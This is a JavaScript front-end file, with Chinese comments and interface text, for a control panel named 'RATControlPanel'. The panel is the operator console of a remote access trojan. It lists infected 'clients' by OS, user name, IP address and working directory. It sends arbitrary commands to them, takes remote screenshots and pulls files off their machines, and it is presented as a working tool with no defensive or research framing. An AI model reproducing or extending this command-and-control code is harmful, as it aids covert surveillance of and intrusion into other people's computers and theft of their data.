// 主要JavaScript功能
class RATControlPanel {
  constructor() {
    this.socket = io();
    this.currentClient = null;
    this.messageHistory = [];
    this.maxHistory = 1000;
    this.lastTimeoutMessage = 0;
    this.timeoutMessageInterval = 5000;
    
    this.init();
  }

  init() {
    this.setupEventListeners();
    this.setupSocketEvents();
    this.loadHistory();
    this.initializeUI();
  }

  setupEventListeners() {
    // 移动端菜单切换
    const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
    const sidebar = document.querySelector('.sidebar');
    const overlay = document.querySelector('.sidebar-overlay');

    if (mobileMenuBtn) {
      mobileMenuBtn.addEventListener('click', () => {
        sidebar.classList.toggle('mobile-open');
        overlay.classList.toggle('active');
      });
    }

    if (overlay) {
      overlay.addEventListener('click', () => {
        sidebar.classList.remove('mobile-open');
        overlay.classList.remove('active');
      });
    }

    // 侧边栏切换功能
    const sidebarToggle = document.querySelector('.sidebar-toggle');
    if (sidebarToggle) {
      sidebarToggle.addEventListener('click', () => {
        this.toggleSidebar();
      });
    }

    // 可折叠面板
    document.querySelectorAll('.panel-header').forEach(header => {
      header.addEventListener('click', () => {
        this.togglePanel(header);
      });
    });

    // 表单提交
    const commandInput = document.getElementById('command-input');
    if (commandInput) {
      commandInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          this.sendCommand();
        }
      });
    }

    const paramInput = document.getElementById('param-value');
    if (paramInput) {
      paramInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          this.sendParamCommand();
        }
      });
    }

    // 模态框关闭
    document.addEventListener('click', (e) => {
      if (e.target.classList.contains('modal-overlay')) {
        this.closeModal(e.target);
      }
    });

    // ESC键关闭模态框
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        const activeModal = document.querySelector('.modal-overlay.active');
        if (activeModal) {
          this.closeModal(activeModal);
        }
      }
    });

    // 响应式处理
    window.addEventListener('resize', () => {
      this.handleResize();
    });
  }

  toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const mainContent = document.querySelector('.main-content');
    const toggleIcon = document.querySelector('.sidebar-toggle i');
    const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
    
    sidebar.classList.toggle('collapsed');
    mainContent.classList.toggle('expanded');
    
    if (sidebar.classList.contains('collapsed')) {
      toggleIcon.className = 'bx bx-chevron-right';
    } else {
      toggleIcon.className = 'bx bx-chevron-left';
    }
    
    // 移动端处理
    if (window.innerWidth <= 768) {
      if (sidebar.classList.contains('mobile-open')) {
        sidebar.classList.remove('mobile-open');
        document.querySelector('.sidebar-overlay').classList.remove('active');
      }
    }
  }

  handleResize() {
    const sidebar = document.querySelector('.sidebar');
    const overlay = document.querySelector('.sidebar-overlay');
    
    // 在桌面端自动关闭移动端菜单
    if (window.innerWidth > 768) {
      if (sidebar.classList.contains('mobile-open')) {
        sidebar.classList.remove('mobile-open');
        overlay.classList.remove('active');
      }
    }
  }

  setupSocketEvents() {
    this.socket.on('connect', () => {
      console.log('[WebSocket] 已连接');
      this.showNotification('已连接到服务器', 'success');
      this.requestClientList();
    });

    this.socket.on('disconnect', () => {
      console.log('[WebSocket] 已断开');
      this.showNotification('与服务器断开连接', 'error');
    });

    this.socket.on('clients_list', (data) => {
      this.updateClientList(data);
    });

    this.socket.on('new_client', (clientData) => {
      console.log('[客户端] 新连接:', clientData);
      this.showNotification(`新客户端连接: ${clientData.id}`, 'info');
      this.requestClientList();
    });

    this.socket.on('client_updated', (clientData) => {
      console.log('[客户端] 信息更新:', clientData);
      this.requestClientList();
    });

    this.socket.on('client_disconnected', (data) => {
      console.log('[客户端] 断开连接:', data);
      this.showNotification(`客户端 ${data.id} 已断开连接`, 'warning');
      this.requestClientList();
    });

    this.socket.on('command_result', (data) => {
      this.handleCommandResult(data);
    });

    this.socket.on('new_screenshot', (data) => {
      this.handleNewScreenshot(data);
    });
  }

  initializeUI() {
    // 默认展开第一个面板
    const firstPanel = document.querySelector('.collapsible-panel');
    if (firstPanel) {
      const header = firstPanel.querySelector('.panel-header');
      const content = firstPanel.querySelector('.panel-content');
      if (header && content) {
        header.classList.add('active');
        content.classList.add('active');
      }
    }

    // 初始化工具提示
    this.initTooltips();

    // 请求客户端列表
    this.requestClientList();

    // 初始化响应式处理
    this.handleResize();
  }

  initTooltips() {
    // 简单的工具提示实现
    document.querySelectorAll('[data-tooltip]').forEach(element => {
      element.addEventListener('mouseenter', (e) => {
        const tooltip = document.createElement('div');
        tooltip.className = 'tooltip-popup';
        tooltip.textContent = e.target.getAttribute('data-tooltip');
        document.body.appendChild(tooltip);

        const rect = e.target.getBoundingClientRect();
        tooltip.style.position = 'absolute';
        tooltip.style.top = `${rect.top - tooltip.offsetHeight - 8}px`;
        tooltip.style.left = `${rect.left + rect.width / 2 - tooltip.offsetWidth / 2}px`;
      });

      element.addEventListener('mouseleave', () => {
        const tooltip = document.querySelector('.tooltip-popup');
        if (tooltip) {
          tooltip.remove();
        }
      });
    });
  }

  togglePanel(header) {
    const panel = header.parentElement;
    const content = panel.querySelector('.panel-content');
    const isActive = header.classList.contains('active');

    if (isActive) {
      header.classList.remove('active');
      content.classList.remove('active');
    } else {
      header.classList.add('active');
      content.classList.add('active');
    }
  }

  requestClientList() {
    this.socket.emit('get_clients');
  }

  updateClientList(data) {
    const clientSelect = document.getElementById('client-select');
    const clientListContainer = document.getElementById('client-list');

    if (clientSelect) {
      this.updateClientDropdown(clientSelect, data);
    }

    if (clientListContainer) {
      this.updateClientCards(clientListContainer, data);
    }
  }

  updateClientDropdown(select, data) {
    const previouslySelected = select.value;
    select.innerHTML = '';

    if (!data || !data.clients || Object.keys(data.clients).length === 0) {
      const option = document.createElement('option');
      option.value = '';
      option.textContent = '无在线客户端';
      option.disabled = true;
      select.appendChild(option);
      return;
    }

    const clientIds = Object.keys(data.clients);
    clientIds.forEach(clientId => {
      const clientInfo = data.clients[clientId];
      const option = document.createElement('option');
      option.value = clientId;
      option.textContent = `客户端 ${clientId} (${clientInfo.user || '未知'}) @ ${clientInfo.addr || '未知IP'}`;
      select.appendChild(option);
    });

    // 恢复之前的选择
    if (clientIds.includes(previouslySelected)) {
      select.value = previouslySelected;
    } else if (clientIds.length > 0) {
      select.value = clientIds[0];
    }
  }

  updateClientCards(container, data) {
    if (!data || !data.clients || Object.keys(data.clients).length === 0) {
      container.innerHTML = `
        <div class="empty-state">
          <i class='bx bx-devices'></i>
          <h3>暂无连接的客户端</h3>
          <p>等待客户端连接中...</p>
        </div>
      `;
      return;
    }

    const clientIds = Object.keys(data.clients);
    container.innerHTML = '';

    clientIds.forEach(clientId => {
      const clientInfo = data.clients[clientId];
      const card = this.createClientCard(clientId, clientInfo);
      container.appendChild(card);
    });
  }

  createClientCard(clientId, clientInfo) {
    const card = document.createElement('div');
    card.className = 'client-card animate-fade-in';
    
    card.innerHTML = `
      <div class="client-header">
        <div class="client-id">
          <i class='bx bx-laptop'></i>
          客户端 ${clientId}
        </div>
        <div class="client-status online">
          <div class="status-dot online"></div>
          在线
        </div>
      </div>
      <div class="client-info">
        <div class="info-item">
          <i class='bx bx-desktop'></i>
          <div class="info-content">
            <div class="info-label">操作系统</div>
            <div class="info-value">${clientInfo.os || '未知'}</div>
          </div>
        </div>
        <div class="info-item">
          <i class='bx bx-user'></i>
          <div class="info-content">
            <div class="info-label">用户</div>
            <div class="info-value">${clientInfo.user || '未知'}</div>
          </div>
        </div>
        <div class="info-item">
          <i class='bx bx-map'></i>
          <div class="info-content">
            <div class="info-label">IP地址</div>
            <div class="info-value">${clientInfo.addr || '未知'}</div>
          </div>
        </div>
        <div class="info-item">
          <i class='bx bx-folder'></i>
          <div class="info-content">
            <div class="info-label">工作目录</div>
            <div class="info-value">${clientInfo.initial_cwd || '未知'}</div>
          </div>
        </div>
      </div>
      <div class="client-actions">
        <button class="btn btn-primary" onclick="window.location.href='/?client=${clientId}'">
          <i class='bx bx-terminal'></i>
          控制台
        </button>
        <button class="btn btn-success" onclick="ratPanel.sendQuickCommand('screenshot', '', '${clientId}')">
          <i class='bx bx-camera'></i>
          截屏
        </button>
      </div>
    `;

    return card;
  }

  sendCommand() {
    const target = document.getElementById('client-select')?.value;
    const cmdFull = document.getElementById('command-input')?.value.trim();

    if (!target) {
      this.showNotification('请先选择一个客户端！', 'warning');
      return;
    }
    if (!cmdFull) {
      this.showNotification('请输入命令！', 'warning');
      return;
    }

    const parts = cmdFull.split(/\s+/);
    const action = parts[0];
    const arg = parts.slice(1).join(' ');

    this.addFeedbackMessage(`正在发送命令: ${cmdFull}`);
    this.socket.emit('send_command', { target, command: { action, arg } });
    
    const input = document.getElementById('command-input');
    if (input) {
      input.value = '';
      input.focus();
    }
  }

  sendQuickCommand(action, arg = '', targetId = null) {
    const target = targetId || document.getElementById('client-select')?.value;
    
    if (!target) {
      this.showNotification('请先选择一个客户端！', 'warning');
      return;
    }

    const cmdDisplay = arg ? `${action} ${arg}` : action;
    this.addFeedbackMessage(`正在发送快捷命令: ${cmdDisplay}`);
    this.socket.emit('send_command', { target, command: { action, arg } });
  }

  showInput(cmd) {
    this.currentCommandForParam = cmd;
    const paramInput = document.getElementById('param-input');
    if (paramInput) {
      paramInput.classList.add('active');
      const input = document.getElementById('param-value');
      if (input) {
        input.focus();
      }
    }
  }

  sendParamCommand() {
    const target = document.getElementById('client-select')?.value;
    const param = document.getElementById('param-value')?.value.trim();

    if (!target) {
      this.showNotification('请先选择一个客户端！', 'warning');
      return;
    }
    if (!param && this.currentCommandForParam === 'download') {
      this.showNotification('请输入要下载的文件路径！', 'warning');
      return;
    }

    if (this.currentCommandForParam) {
      const cmdDisplay = this.currentCommandForParam === 'download' ? '下载' : '参数';
      this.addFeedbackMessage(`正在发送${cmdDisplay}命令: ${this.currentCommandForParam} ${param}`);
      
      this.sendQuickCommand(this.currentCommandForParam, param);
      
      const paramInput = document.getElementById('param-input');
      const paramValue = document.getElementById('param-value');
      if (paramInput) paramInput.classList.remove('active');
      if (paramValue) paramValue.value = '';
    }
  }

  useCommand(cmd) {
    const input = document.getElementById('command-input');
    if (input) {
      input.value = cmd;
      input.focus();
    }
  }

  handleCommandResult(data) {
    const terminal = document.getElementById('output');
    if (!terminal) return;

    // 检查超时消息限制
    if (data.output && data.output.includes('客户端响应超时')) {
      const now = Date.now();
      if (now - this.lastTimeoutMessage < this.timeoutMessageInterval) {
        return;
      }
      this.lastTimeoutMessage = now;
    }

    const timestamp = new Date().toLocaleTimeString();
    const line = document.createElement('div');
    line.className = 'terminal-line';

    // 添加时间戳
    const timeSpan = document.createElement('span');
    timeSpan.className = 'terminal-timestamp';
    timeSpan.textContent = `[${timestamp}] `;
    line.appendChild(timeSpan);

    // 处理不同类型的消息
    if (data.is_error) {
      line.classList.add('terminal-error');
    } else if (data.is_success) {
      line.classList.add('terminal-success');
    } else if (data.is_warning) {
      line.classList.add('terminal-warning');
    }

    // 处理输出内容
    let cleanOutput = data.output
      .replace(/<pre>/g, '')
      .replace(/<\/pre>/g, '')
      .replace(/<[^>]*>/g, '');

    // 处理客户端标识
    const clientMatch = cleanOutput.match(/^(\[\d+\])\s*/);
    if (clientMatch) {
      const clientSpan = document.createElement('span');
      clientSpan.className = 'terminal-client';
      clientSpan.textContent = clientMatch[1] + ' ';
      line.appendChild(clientSpan);
      cleanOutput = cleanOutput.substring(clientMatch[0].length);
    }

    // 添加内容
    if (data.is_file_link && data.file_url) {
      const link = document.createElement('a');
      link.href = data.file_url;
      link.target = '_blank';
      link.textContent = cleanOutput;
      line.appendChild(link);
    } else {
      const contentSpan = document.createElement('span');
      contentSpan.textContent = cleanOutput;
      line.appendChild(contentSpan);
    }

    // 保存到历史记录
    this.saveToHistory({
      htmlContent: line.outerHTML,
      is_error: data.is_error,
      is_success: data.is_success,
      is_warning: data.is_warning,
      timestamp: timestamp
    });

    terminal.appendChild(line);
    requestAnimationFrame(() => {
      terminal.scrollTop = terminal.scrollHeight;
    });
  }

  addFeedbackMessage(message) {
    const terminal = document.getElementById('output');
    if (!terminal) return;

    const timestamp = new Date().toLocaleTimeString();
    const line = document.createElement('div');
    line.className = 'terminal-line';

    const timeSpan = document.createElement('span');
    timeSpan.className = 'terminal-timestamp';
    timeSpan.textContent = `[${timestamp}] `;
    line.appendChild(timeSpan);

    const systemSpan = document.createElement('span');
    systemSpan.className = 'terminal-system';
    systemSpan.textContent = '[系统] ';
    line.appendChild(systemSpan);

    const messageSpan = document.createElement('span');
    messageSpan.textContent = message;
    line.appendChild(messageSpan);

    this.saveToHistory({
      htmlContent: line.outerHTML,
      timestamp: timestamp
    });

    terminal.appendChild(line);
    requestAnimationFrame(() => {
      terminal.scrollTop = terminal.scrollHeight;
    });
  }

  handleNewScreenshot(data) {
    console.log('收到新截图通知:', data);
    
    const modal = document.getElementById('screenshotModal');
    if (!modal) return;

    const modalTitle = modal.querySelector('.modal-title');
    const modalImage = modal.querySelector('#screenshotImage');
    const downloadLink = modal.querySelector('#screenshotDownloadLink');

    if (modalTitle) modalTitle.textContent = `来自客户端 ${data.client_id} 的新截图`;
    if (modalImage) modalImage.src = data.url;
    if (downloadLink) {
      downloadLink.href = data.url;
      downloadLink.download = data.filename;
    }

    this.showModal(modal);
    this.showNotification(`收到来自客户端 ${data.client_id} 的新截图`, 'success');
  }

  showModal(modal) {
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  closeModal(modal) {
    modal.classList.remove('active');
    document.body.style.overflow = '';
  }

  saveToHistory(message) {
    this.messageHistory.push(message);
    if (this.messageHistory.length > this.maxHistory) {
      this.messageHistory.shift();
    }
    localStorage.setItem('messageHistory', JSON.stringify(this.messageHistory));
  }

  loadHistory() {
    const saved = localStorage.getItem('messageHistory');
    if (saved) {
      this.messageHistory = JSON.parse(saved);
      const terminal = document.getElementById('output');
      if (terminal) {
        terminal.innerHTML = '';
        this.messageHistory.forEach(msg => {
          terminal.innerHTML += msg.htmlContent;
        });
        terminal.scrollTop = terminal.scrollHeight;
      }
    }
  }

  showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
      <div style="display: flex; align-items: center; gap: 0.75rem;">
        <i class='bx ${this.getNotificationIcon(type)}'></i>
        <span>${message}</span>
      </div>
    `;

    document.body.appendChild(notification);

    // 显示通知
    setTimeout(() => notification.classList.add('show'), 100);

    // 自动隐藏
    setTimeout(() => {
      notification.classList.remove('show');
      setTimeout(() => notification.remove(), 300);
    }, 4000);
  }

  getNotificationIcon(type) {
    const icons = {
      success: 'bx-check-circle',
      error: 'bx-error-circle',
      warning: 'bx-error',
      info: 'bx-info-circle'
    };
    return icons[type] || icons.info;
  }
}

// 全局实例
let ratPanel;

// 页面加载完成后初始化
document.addEventListener('DOMContentLoaded', () => {
  ratPanel = new RATControlPanel();
});

// 全局函数（保持向后兼容）
function sendCommand() {
  ratPanel?.sendCommand();
}

function sendQuickCommand(action, arg = '') {
  ratPanel?.sendQuickCommand(action, arg);
}

function showInput(cmd) {
  ratPanel?.showInput(cmd);
}

function sendParamCommand() {
  ratPanel?.sendParamCommand();
}

function useCommand(cmd) {
  ratPanel?.useCommand(cmd);
}

function togglePanel(header) {
  ratPanel?.togglePanel(header);
}

function openModal(src, name) {
  const modal = document.getElementById('imageModal');
  const modalImg = document.getElementById('modalImage');
  if (modal && modalImg) {
    modalImg.src = src;
    window.currentImageName = name;
    ratPanel?.showModal(modal);
  }
}

function closeModal() {
  const modal = document.getElementById('imageModal');
  if (modal) {
    ratPanel?.closeModal(modal);
  }
}

function saveImage(url, filename) {
  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

function deleteImage(filename) {
  if (confirm('确定要删除这张截图吗？')) {
    fetch(`/delete_file/${filename}`, {
      method: 'POST'
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        closeModal();
        location.reload();
        ratPanel?.showNotification('文件删除成功', 'success');
      } else {
        ratPanel?.showNotification('删除失败：' + data.error, 'error');
      }
    })
    .catch(error => {
      ratPanel?.showNotification('删除失败：' + error, 'error');
    });
  }
}